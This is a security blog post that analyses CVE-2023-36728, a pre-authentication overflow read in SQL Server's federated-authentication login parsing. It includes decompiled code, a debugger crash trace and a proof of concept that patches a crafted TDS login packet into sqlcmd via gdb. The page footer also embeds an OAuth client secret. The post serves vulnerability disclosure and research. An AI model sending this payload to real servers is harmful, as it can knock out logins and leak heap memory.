<!DOCTYPE html><html lang="zh-CN"><head><meta charset="utf-8"><meta name="X-UA-Compatible" content="IE=edge"><title> Windows SQL Server Pre-Auth Overflow Read(CVE-2023-36728) · VictorV的小博客</title><meta name="description" content="Windows SQL Server Pre-Auth Overflow Read(CVE-2023-36728) - VictorV"><meta name="viewport" content="width=device-width, initial-scale=1"><link rel="icon" href="/favicon.png"><link rel="stylesheet" href="/css/apollo.css"><link rel="search" type="application/opensearchdescription+xml" href="http://474172261.github.io/atom.xml" title="VictorV的小博客"><meta name="generator" content="Hexo 6.2.0"><link rel="alternate" href="/atom.xml" title="VictorV的小博客" type="application/atom+xml">
</head><body><div class="wrap"><header><a href="/" class="logo-link"><img src="/images/favicon.png" alt="logo"></a><ul class="nav nav-list"><li class="nav-list-item"><a href="/" target="_self" class="nav-list-link">BLOG</a></li><li class="nav-list-item"><a href="/archives/" target="_self" class="nav-list-link">ARCHIVE</a></li><li class="nav-list-item"><a href="https://twitter.com/vv474172261" target="_blank" class="nav-list-link">TWITTER</a></li><li class="nav-list-item"><a href="https://github.com/474172261" target="_blank" class="nav-list-link">GITHUB</a></li></ul></header><main class="container"><div class="post"><article class="post-block"><h1 class="post-title">Windows SQL Server Pre-Auth Overflow Read(CVE-2023-36728)</h1><div class="post-info">2023年10月16日</div><div class="post-content"><p>这个是一个sql server的未认证远程dos的bug解析.</p>
<span id="more"></span>

<h2 id="Environment"><a href="#Environment" class="headerlink" title="Environment"></a>Environment</h2><p><strong>SQL Server Version</strong>: sql server 2022.160.4035.4</p>
<p><strong>Host System</strong>: windows 1809</p>
<h2 id="Bug"><a href="#Bug" class="headerlink" title="Bug"></a>Bug</h2><p>in file <code>sqllang.dll</code> version <code>2022.160.4035.4</code>, function <code>CFedAuthFeatureExtension::ReadIDCRLToken</code>:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">v4 = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span> ( !*a3 )</span><br><span class="line">&#123;</span><br><span class="line">  *(_DWORD *)a4 = <span class="number">9</span>;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>i64;</span><br><span class="line">&#125;</span><br><span class="line">v8 = a2 + <span class="number">4</span>;</span><br><span class="line">len1 = *(<span class="type">unsigned</span> <span class="type">int</span> *)a2;</span><br><span class="line">v10 = *a3 - <span class="number">4</span>;</span><br><span class="line"><span class="keyword">if</span> ( *a3 == <span class="number">4</span> )</span><br><span class="line">&#123;</span><br><span class="line">  *(_DWORD *)a4 = <span class="number">10</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">  *((_DWORD *)this + <span class="number">28</span>) = v10 - (len1 + <span class="number">0x40</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v10 &gt;= (<span class="type">int</span>)len1 + <span class="number">0x40</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    _mm_lfence();</span><br><span class="line">    v11 = <span class="number">2</span>i64 * (((<span class="type">unsigned</span> <span class="type">int</span>)len1 &gt;&gt; <span class="number">1</span>) + <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span> ( !is_mul_ok(((<span class="type">unsigned</span> <span class="type">int</span>)len1 &gt;&gt; <span class="number">1</span>) + <span class="number">1</span>, <span class="number">2u</span>i64) )</span><br><span class="line">      v11 = <span class="number">-1</span>i64;</span><br><span class="line">    v12 = operator new[](v11, *((<span class="keyword">struct</span> IMemObj **)this + <span class="number">2</span>), <span class="number">1</span>, <span class="string">&quot;sql\\ntdbms\\tds\\src\\featureext.cpp&quot;</span>, <span class="number">1585</span>, <span class="number">3u</span>);</span><br><span class="line">    *((_QWORD *)this + <span class="number">7</span>) = v12;</span><br><span class="line">    <span class="keyword">if</span> ( v12 )</span><br><span class="line">    &#123;</span><br><span class="line">      _mm_lfence();</span><br><span class="line">      memcpy_s(*((<span class="type">void</span> *<span class="type">const</span> *)this + <span class="number">7</span>), len1, v8, len1);</span><br></pre></td></tr></table></figure>

<p>*a3 means data length, a2 is a buffer controlled by user.</p>
<p>at line 9, if we let <code>*a3==3</code>, then v10 will be 0xffffffff. And at line 28, it will overflow read from a2.</p>
<h2 id="Impact"><a href="#Impact" class="headerlink" title="Impact"></a>Impact</h2><p>Though process doesn’t crash(only thread crashed), it will cause extra problems, for example, if it crashed many times, no one can login into the server, even through local SSMS. And sql server configuration manager can’t restart service. Furthermore, it overflows reads data from heap, may leak important information with extra skills.</p>
<h2 id="Crash-Stack-Trace"><a href="#Crash-Stack-Trace" class="headerlink" title="Crash Stack Trace"></a>Crash Stack Trace</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">(168c.27a4): Access violation - code c0000005 (first chance)</span><br><span class="line">First chance exceptions are reported before any exception handling.</span><br><span class="line">This exception may be expected and handled.</span><br><span class="line">sqllang!memcpy+0x180:</span><br><span class="line">00007ffd`78f382fc c4a17e6f6c02e0  vmovdqu ymm5,ymmword ptr [rdx+r8-20h] ds:000001c2`20ff9b3d=??</span><br><span class="line">0:019&gt; k</span><br><span class="line"> # Child-SP          RetAddr               Call Site</span><br><span class="line">00 0000008f`407fe9e8 00007ffd`78f33493     sqllang!memcpy+0x180</span><br><span class="line">01 0000008f`407fe9f0 00007ffd`79a99658     sqllang!memcpy_s+0x5e</span><br><span class="line">02 0000008f`407fea20 00007ffd`79a99525     sqllang!CFedAuthFeatureExtension::ReadIDCRLToken+0xe6</span><br><span class="line">03 0000008f`407fea80 00007ffd`78f955b9     sqllang!CFedAuthFeatureExtension::ParseFeatureData+0x245</span><br><span class="line">04 0000008f`407fead0 00007ffd`78f93f6f     sqllang!CPhysicalConnection::FParseFeatureExtension+0x29e</span><br><span class="line">05 0000008f`407fec30 00007ffd`78f93c8e     sqllang!CPhysicalConnection::FCreateLoginRec+0x6dd</span><br><span class="line">06 0000008f`407feea0 00007ffd`78f93b0b     sqllang!process_login+0x24e</span><br><span class="line">07 0000008f`407fef40 00007ffd`78f46c30     sqllang!process_commands_internal+0x45b</span><br><span class="line">08 0000008f`407ff080 00007ffd`7ef088db     sqllang!process_messages+0x1e0</span><br><span class="line">09 0000008f`407ff230 00007ffd`7ef09298     sqldk!SOS_Task::Param::Execute+0x232</span><br><span class="line">0a 0000008f`407ff830 00007ffd`7ef08df4     sqldk!SOS_Scheduler::RunTask+0x182</span><br><span class="line">0b 0000008f`407ff930 00007ffd`7ef28293     sqldk!SOS_Scheduler::ProcessTasks+0x344</span><br><span class="line">0c 0000008f`407ffa80 00007ffd`7ef2833c     sqldk!Worker::EntryPoint+0x2f9</span><br><span class="line">0d 0000008f`407ffb60 00007ffd`7ef27f7f     sqldk!ThreadScheduler::RunWorker+0xc</span><br><span class="line">0e 0000008f`407ffb90 00007ffd`7ef27c65     sqldk!SystemThreadDispatcher::ProcessWorker+0x589</span><br><span class="line">0f 0000008f`407ffc70 00007ffd`b8447e94     sqldk!SchedulerManager::ThreadEntryPoint+0x3cf</span><br><span class="line">10 0000008f`407ffd80 00007ffd`babf7ad1     KERNEL32!BaseThreadInitThunk+0x14</span><br><span class="line">11 0000008f`407ffdb0 00000000`00000000     ntdll!RtlUserThreadStart+0x21</span><br><span class="line">0:019&gt; r</span><br><span class="line">rax=000001c226000040 rbx=0000000000ccffff rcx=000001c226000040</span><br><span class="line">rdx=000001c220329b5e rsi=000001c220329b5e rdi=0000000000ccffff</span><br><span class="line">rip=00007ffd78f382fc rsp=0000008f407fe9e8 rbp=00000000ffffffff</span><br><span class="line"> r8=0000000000ccffff  r9=000001c220ff9b5d r10=00007ffd78f30000</span><br><span class="line">r11=0000008f407fe928 r12=0000000000000000 r13=000001c220329b5e</span><br><span class="line">r14=0000000000ccffff r15=0000000000668000</span><br><span class="line">iopl=0         nv up ei pl nz na po nc</span><br><span class="line">cs=0033  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010206</span><br><span class="line">sqllang!memcpy+0x180:</span><br><span class="line">00007ffd`78f382fc c4a17e6f6c02e0  vmovdqu ymm5,ymmword ptr [rdx+r8-20h] ds:000001c2`20ff9b3d=??</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><ol>
<li><p>install sqlcmd in Centos7</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ sudo rpm -i msodbcsql17-17.2.0.1-1.x86_64.rpm</span><br><span class="line">$ sudo rpm -i mssql-tools-17.2.0.1-1.x86_64.rpm</span><br></pre></td></tr></table></figure>
</li>
<li><p>install gdb in Centos7</p>
</li>
<li><p>create a new SQL Server 2022(I tested locally, I can give a Azure Sql Server test case if you need)</p>
</li>
<li><p>connect SQL Server to Azure AD by (<a target="_blank" rel="noopener" href="https://learn.microsoft.com/en-us/sql/relational-databases/security/authentication-access/azure-ad-authentication-sql-server-setup-tutorial?view=sql-server-ver16">https://learn.microsoft.com/en-us/sql/relational-databases/security/authentication-access/azure-ad-authentication-sql-server-setup-tutorial?view=sql-server-ver16</a>)</p>
</li>
<li><p>install windbg in SQL Server machine</p>
</li>
<li><p>the sql server should be like this, in this picture, target process is 5772<img src="/images/sqlserver-dos-CVE-2023-36728.assets/1686738413775.png" alt="1686738413775"></p>
</li>
<li><p>use windbg attach 5772</p>
</li>
<li><p>in Centos:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">$ gdb  --args /opt/mssql-tools/bin/sqlcmd   -S 192.168.150.141,50128 -G -C -U &quot;aabb&quot; -P &quot;a&quot;</span><br><span class="line">gdb$ b main</span><br><span class="line">gdb$ r</span><br><span class="line">gdb$ b send</span><br><span class="line">gdb$ c</span><br><span class="line">Breakpoint 2, 0x00007ffff6b30be0 in send () from /lib64/libpthread.so.0</span><br><span class="line">gdb$ b SSL_write</span><br><span class="line">gdb$ disa 1 2</span><br><span class="line">gdb$ c</span><br><span class="line">Breakpoint 3, 0x00007fffee1f5740 in SSL_write () from /lib64/libssl.so.10</span><br><span class="line">gdb$ set &#123;char[241]&#125;$rsi=&quot;\x10\x01\x00\xe5\x00\x00\x00\x00\xdd\x00\x00\x00\x04\x00\x00\x74\x00\x10\x00\x00\x00\x00\x00\x07\xbb\xaa\x00\x00\x00\x00\x00\x00\xe0\x03\x00\x10\xf0\x00\x00\x00\x09\x04\x00\x00\x5e\x00\x0a\x00\x72\x00\x00\x00\x72\x00\x00\x00\x72\x00\x0c\x00\x8a\x00\x0f\x00\xd0\x00\x04\x00\x8e\x00\x0e\x00\xaa\x00\x00\x00\xaa\x00\x06\x00\x00\xe0\x4c\x68\x0d\x9c\xb6\x00\x00\x00\xb6\x00\x00\x00\xb6\x00\x00\x00\x00\x00\x00\x00\x54\x00\x65\x00\x73\x00\x74\x00\x43\x00\x6c\x00\x69\x00\x65\x00\x6e\x00\x74\x00\x50\x00\x79\x00\x54\x00\x65\x00\x73\x00\x74\x00\x43\x00\x6c\x00\x69\x00\x65\x00\x6e\x00\x74\x00\x31\x00\x39\x00\x32\x00\x2e\x00\x31\x00\x36\x00\x38\x00\x2e\x00\x31\x00\x35\x00\x30\x00\x2e\x00\x31\x00\x34\x00\x31\x00\x50\x00\x79\x00\x20\x00\x54\x00\x44\x00\x53\x00\x20\x00\x6c\x00\x69\x00\x62\x00\x72\x00\x61\x00\x72\x00\x79\x00\x6d\x00\x61\x00\x73\x00\x74\x00\x65\x00\x72\x00\xd4\x00\x00\x00\x02\x04\x00\x00\x00\x00\xff\xff\xcc&quot;</span><br><span class="line">gdb$ set $rdx=0xE5</span><br><span class="line">gdb$ set $r12=0xe5</span><br><span class="line">gdb$ c</span><br></pre></td></tr></table></figure>

</li>
<li><p>in SQL Server, windbg:</p>
<p><img src="/images/sqlserver-dos-CVE-2023-36728.assets/1686738647013.png" alt="1686738647013"></p>
</li>
</ol>
</div></article></div></main><footer><div class="paginator"><a href="/2024/04/02/CPlusPlus_Exception/" class="prev">PREV</a><a href="/2023/10/11/unusual_knowledge/" class="next">NEXT</a></div><div id="container"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.css"><script src="https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js"></script><div id="gitalk-container"></div><script>const gitalk = new Gitalk({
    clientID: '28b1a73c3ed656a9a85d',     
    clientSecret: '59837bb4cbe7b2f12df366fdbcb37fa4ba084d44',     
    id: 'Mon Oct 16 2023 10:08:37 GMT+0800',    
    repo: 'blog-comment',     
    owner: '474172261',     
    admin: '474172261',     
})   
gitalk.render('gitalk-container')</script><div class="copyright"><p>© 2015 - 2024 <a href="http://474172261.github.io">VictorV</a>, powered by <a href="https://hexo.io/" target="_blank">Hexo</a> and <a href="https://github.com/pinggod/hexo-theme-apollo" target="_blank">hexo-theme-apollo</a>.</p></div></footer></div><script async src="//cdn.bootcss.com/mathjax/2.7.0/MathJax.js?config=TeX-MML-AM_CHTML" integrity="sha384-crwIf/BuaWM9rM65iM+dWFldgQ1Un8jWZMuh3puxb8TOY9+linwLoI7ZHZT+aekW" crossorigin="anonymous"></script></body></html>